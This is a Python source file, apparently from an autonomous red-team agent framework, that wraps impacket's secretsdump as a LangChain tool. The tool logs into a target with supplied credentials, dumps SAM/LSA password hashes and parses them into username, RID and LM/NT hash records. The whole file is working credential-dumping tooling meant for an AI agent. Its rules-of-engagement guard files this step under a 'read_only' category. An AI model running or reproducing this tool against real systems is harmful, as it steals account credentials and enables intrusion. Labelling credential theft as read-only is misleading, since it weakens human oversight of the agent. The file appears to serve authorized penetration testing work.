import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.subprocess_runner import run_subprocess
from autored.tools.nmap import _save_raw

log = get_logger("tools.secretsdump")


class SecretsdumpResult(BaseModel):
    host_ip: str
    hashes: list[dict] = Field(default_factory=list)
    raw_output_path: str = ""
    command: str = ""
    duration_sec: float = 0.0


# Impacket secretsdump emits SAM hash lines in the canonical format
# ``username:rid:lmhash:nthash:::`` — match the whole 7-field layout.
_HASH_LINE_RE = re.compile(
    r"^(?P<username>[^:\s]+):(?P<rid>\d+):"
    r"(?P<lmhash>[0-9a-fA-F]+):(?P<nthash>[0-9a-fA-F]+):::",
    re.MULTILINE,
)


def _parse_secretsdump_output(text: str, host_ip: str) -> SecretsdumpResult:
    """Parse impacket secretsdump stdout into a list of SAM hashes.

    Each match becomes a dict with ``username``, ``rid``, ``lmhash`` and
    ``nthash`` keys (all lowercased hex for the hashes).
    """
    result = SecretsdumpResult(host_ip=host_ip)
    if not text:
        return result
    for m in _HASH_LINE_RE.finditer(text):
        result.hashes.append({
            "username": m.group("username"),
            "rid": m.group("rid"),
            "lmhash": m.group("lmhash").lower(),
            "nthash": m.group("nthash").lower(),
        })
    return result


def _build_secretsdump_cmd(
    username: str, password: str, target: str,
) -> list[str]:
    """Build the impacket secretsdump.py command for local SAM dumping.

    Uses ``-just-dc``-free default semantics (full SAM + LSA dump) with
    explicit credentials and target. Output is written to stdout so the
    AutoRed subprocess runner can capture it directly.
    """
    return [
        "secretsdump.py",
        "-user", username,
        "-pass", password,
        target,
    ]


@tool
@roe_guard(allowed_categories=["read_only"])
async def secretsdump(
    username: str,
    password: str,
    target: str,
    engagement_id: str = "",
) -> SecretsdumpResult:
    """Dump SAM/NTDS hashes from a target via impacket secretsdump.

    Runs ``secretsdump.py`` on the AutoRed host (impacket is a Python
    tool) and parses the captured stdout for ``username:rid:lmhash:nthash``
    lines.

    Args:
        username: Username to authenticate as (e.g., "Administrator")
        password: Password for ``username``
        target: Target IP or HOST\\username spec (e.g., "10.10.10.5")
        engagement_id: Current engagement ID

    Returns:
        SecretsdumpResult with the list of parsed SAM hashes.
    """
    cmd = _build_secretsdump_cmd(username, password, target)
    log.info("secretsdump_start", target=target)

    result = await run_subprocess(cmd, timeout=300)
    raw_path = await _save_raw(
        "secretsdump", target, result.stdout, result.stderr, engagement_id,
    )

    parsed = _parse_secretsdump_output(result.stdout, target)
    parsed.raw_output_path = raw_path
    parsed.command = result.command
    parsed.duration_sec = result.duration_sec

    log.info(
        "secretsdump_done",
        target=target, returncode=result.returncode,
        hashes=len(parsed.hashes), duration=result.duration_sec,
    )
    return parsed
